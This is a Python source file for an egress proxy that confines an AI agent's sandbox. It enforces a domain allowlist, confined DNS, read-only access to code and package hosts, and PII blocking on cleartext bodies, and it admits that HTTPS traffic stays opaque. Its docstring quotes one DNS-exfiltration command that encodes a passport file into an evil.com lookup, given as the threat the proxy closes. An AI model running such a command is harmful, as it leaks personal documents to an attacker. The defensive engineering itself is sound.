#!/usr/bin/env python3
"""P3 Tier-1 egress-proxy — the network chokepoint (FASE-1 of the SOTA meta-dev-loop).

Spec: research/operations/specs/P3-test-prod-sandbox.md §3.2.

The SOLE container bridging sandbox_internal <-> egress. Every byte the agent sends
outbound passes through here, or it does not leave (the agent's container has no
external route — confinement is the Docker network topology, §3.1).

THREE filters (spec §3.2), with ONE honest limitation made explicit (operator
decision 2026-06-07, option B "DLP onesto-limitato"):

  1. Domain allowlist        — both CONNECT (HTTPS) and plain HTTP. 403 otherwise.
  2. DNS confined            — only THIS resolver resolves; agent has no external
                               resolver, no DoH. Closes the `curl $(cat passport
                               | base64).evil.com` DNS-exfil (P0 #2).
  3. DLP on body             — runs scripts/_redact_pii.py on the request body.
                               If the redactor CHANGES the body, PII was found ->
                               403 (fail-closed). Closes the "firewall blind to
                               content" central flaw (§2) — BUT ONLY for traffic
                               the proxy can read in cleartext (plain HTTP, or the
                               CONNECT control path). For an HTTPS CONNECT tunnel
                               the body is end-to-end encrypted and OPAQUE to this
                               proxy: DLP-on-encrypted-HTTPS requires TLS-intercept
                               (MITM + a CA trusted by the agent) and is DEFERRED to
                               Tier-1.5. This is the honest residue (spec §7), not a
                               hidden gap: see DLP_HTTPS_OPAQUE_NOTE below.

  WRITE-method guard (P0 #3): POST/PUT/PATCH/DELETE to allowlisted *write* domains
  (github, pypi, npm) are blocked — only GET/pull. Write tokens are never mounted
  in the agent container, so even a passed write would have no credentials.

Stdlib only (no pip deps in the proxy image beyond the redactor's own deps).
"""
from __future__ import annotations

import contextlib
import logging
import os
import select
import socket
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

logging.basicConfig(
    level=os.environ.get("PROXY_LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s egress-proxy: %(message)s",
)
log = logging.getLogger("egress-proxy")

DLP_HTTPS_OPAQUE_NOTE = (
    "DLP runs on cleartext bodies only. An HTTPS CONNECT tunnel is end-to-end "
    "encrypted and opaque to this proxy; content-DLP over encrypted HTTPS needs "
    "TLS-intercept (Tier-1.5, deferred). Allowlist + DNS-confinement + write-method "
    "guard DO apply to CONNECT."
)

PROXY_PORT = int(os.environ.get("PROXY_PORT", "8888"))

# scripts/_redact_pii.py — the P2 redactor, hosted here at the network edge.
# Resolved relative to repo root inside the proxy image (see egress-proxy.Dockerfile).
REDACTOR = Path(
    os.environ.get("REDACTOR_PATH", "/app/scripts/_redact_pii.py")
)

DLP_ENABLED = os.environ.get("DLP_ENABLED", "1") == "1"
# On the proxy host there is no Postgres -> redactor's dynamic CRM-name pass is
# skipped (static NPWP/KTP/passport passes still run). The redactor itself
# tolerates pg_url=None; this env documents the intent for operators.
REDACT_PG_DISABLED = os.environ.get("REDACT_PG_DISABLED", "1") == "1"


def _parse_allowlist() -> set[str]:
    raw = os.environ.get("EGRESS_ALLOWLIST", "")
    # tolerate whitespace/newlines from the YAML folded scalar
    return {d.strip().lower() for d in raw.replace("\n", ",").split(",") if d.strip()}


ALLOWLIST = _parse_allowlist()

# Domains where WRITE methods are blocked (read-only egress). Spec §3.2 P0 #3.
WRITE_BLOCKED_DOMAINS = {
    "github.com",
    "codeload.github.com",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
}
WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}


def _host_allowed(host: str) -> bool:
    """Exact-match or subdomain-match against the allowlist."""
    host = (host or "").lower().split(":")[0]
    if host in ALLOWLIST:
        return True
    # allow subdomains of an allowlisted apex (e.g. objects.githubusercontent.com
    # is NOT auto-allowed — only explicit apexes + their direct subdomains)
    return any(host.endswith("." + apex) for apex in ALLOWLIST)


def _dlp_blocks(body: bytes) -> bool:
    """Run the P2 redactor on a cleartext body. True => PII found => block.

    Fail-closed: if the redactor errors (incl. its own fail-closed on empty/all-PII
    input), we BLOCK. Empty bodies are handled by the caller (never reach here).
    """
    if not DLP_ENABLED or not body:
        return False
    if not REDACTOR.exists():
        log.error("DLP enabled but redactor missing at %s -> fail-closed BLOCK", REDACTOR)
        return True
    try:
        proc = subprocess.run(
            [sys.executable, str(REDACTOR)],
            input=body,
            capture_output=True,
            timeout=10,
        )
    except Exception as e:  # any failure => fail-closed
        log.error("DLP subprocess failed (%s) -> fail-closed BLOCK", e)
        return True
    if proc.returncode != 0:
        # redactor fail-closed (RedactionError) -> treat as PII present
        log.warning("DLP redactor returncode=%s -> BLOCK", proc.returncode)
        return True
    # If the redacted output differs from the input, the redactor changed something
    # => PII was present => block (we do NOT silently forward redacted; fail-closed).
    return proc.stdout != body


class EgressHandler(BaseHTTPRequestHandler):
    server_version = "p3-egress-proxy/1.0"
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args) -> None:  # route through logging
        log.info("%s - %s", self.address_string(), fmt % args)

    def _deny(self, code: int, reason: str) -> None:
        body = reason.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    # --- HTTPS: CONNECT tunnel (allowlist + DNS-confine; body opaque, no DLP) ----
    def do_CONNECT(self) -> None:
        host, _, port = self.path.partition(":")
        port_num = int(port) if port else 443
        if not _host_allowed(host):
            log.warning("CONNECT DENY %s (not allowlisted)", host)
            return self._deny(403, f"egress denied: {host} not in allowlist\n")
        # Write-method guard cannot apply to an opaque tunnel; for write-domains we
        # rely on no-write-token-mounted (spec §3.2). Allow the tunnel, log it.
        try:
            upstream = socket.create_connection((host, port_num), timeout=10)
        except OSError as e:
            log.warning("CONNECT %s upstream fail: %s", host, e)
            return self._deny(502, f"upstream connect failed: {e}\n")
        self.send_response(200, "Connection Established")
        self.end_headers()
        log.info("CONNECT OK %s:%s (HTTPS opaque — %s)", host, port_num, "DLP n/a")
        self._tunnel(self.connection, upstream)

    @staticmethod
    def _tunnel(client: socket.socket, upstream: socket.socket) -> None:
        sockets = [client, upstream]
        try:
            while True:
                readable, _, exceptional = select.select(sockets, [], sockets, 30)
                if exceptional or not readable:
                    break
                for s in readable:
                    data = s.recv(65536)
                    if not data:
                        return
                    (upstream if s is client else client).sendall(data)
        except OSError:
            pass
        finally:
            for s in (client, upstream):
                with contextlib.suppress(OSError):
                    s.close()

    # --- plain HTTP: full visibility -> allowlist + write-guard + DLP-on-body -----
    def _handle_plain(self) -> None:
        parts = urlsplit(self.path)
        host = parts.hostname or self.headers.get("Host", "")
        if not _host_allowed(host):
            log.warning("%s DENY %s (not allowlisted)", self.command, host)
            return self._deny(403, f"egress denied: {host} not in allowlist\n")

        if self.command in WRITE_METHODS and host.lower() in WRITE_BLOCKED_DOMAINS:
            log.warning("%s DENY %s (write-method blocked on read-only domain)", self.command, host)
            return self._deny(403, f"egress denied: {self.command} blocked on {host} (read-only)\n")

        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length > 0 else b""

        if body and _dlp_blocks(body):
            log.warning("%s DLP-BLOCK %s (PII detected in body)", self.command, host)
            return self._deny(403, "egress denied: DLP blocked outbound body (PII detected)\n")

        # Forward upstream (plain HTTP). Minimal pass-through.
        port = parts.port or 80
        try:
            upstream = socket.create_connection((host, port), timeout=10)
        except OSError as e:
            return self._deny(502, f"upstream connect failed: {e}\n")
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        req = f"{self.command} {path} HTTP/1.1\r\n"
        req += f"Host: {host}\r\n"
        for k, v in self.headers.items():
            if k.lower() in ("proxy-connection", "host", "content-length"):
                continue
            req += f"{k}: {v}\r\n"
        if body:
            req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: close\r\n\r\n"
        try:
            upstream.sendall(req.encode() + body)
            self.connection.settimeout(30)
            while True:
                chunk = upstream.recv(65536)
                if not chunk:
                    break
                self.wfile.write(chunk)
        except OSError as e:
            log.warning("plain forward %s error: %s", host, e)
        finally:
            upstream.close()

    # Map every plain-HTTP verb to the same handler.
    do_GET = _handle_plain
    do_POST = _handle_plain
    do_PUT = _handle_plain
    do_PATCH = _handle_plain
    do_DELETE = _handle_plain
    do_HEAD = _handle_plain
    do_OPTIONS = _handle_plain


def main() -> int:
    if not ALLOWLIST:
        log.error("EGRESS_ALLOWLIST is empty -> default-deny everything. Set it.")
    log.info("egress-proxy starting on :%d", PROXY_PORT)
    log.info("allowlist: %s", sorted(ALLOWLIST))
    log.info("DLP_ENABLED=%s redactor=%s pg_disabled=%s", DLP_ENABLED, REDACTOR, REDACT_PG_DISABLED)
    log.info(DLP_HTTPS_OPAQUE_NOTE)
    httpd = ThreadingHTTPServer(("0.0.0.0", PROXY_PORT), EgressHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
